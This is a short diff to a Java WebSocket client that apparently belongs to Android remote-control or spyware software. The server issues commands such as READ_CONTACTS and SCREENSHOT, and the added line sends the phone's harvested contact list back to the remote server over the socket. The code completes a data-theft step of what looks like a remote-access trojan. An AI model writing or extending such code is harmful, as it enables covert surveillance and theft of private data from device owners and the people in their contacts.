@@ -113,6 +113,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                 case READ_CONTACTS:
                     json.put("contacts", mapToJson(Phone.readContacts(context)).toString());
                     json.put("res", "contact");
+                    send(json.toString());
                     break;
                 case SCREENSHOT:
                     path = Screenshot.captureScreen(context);
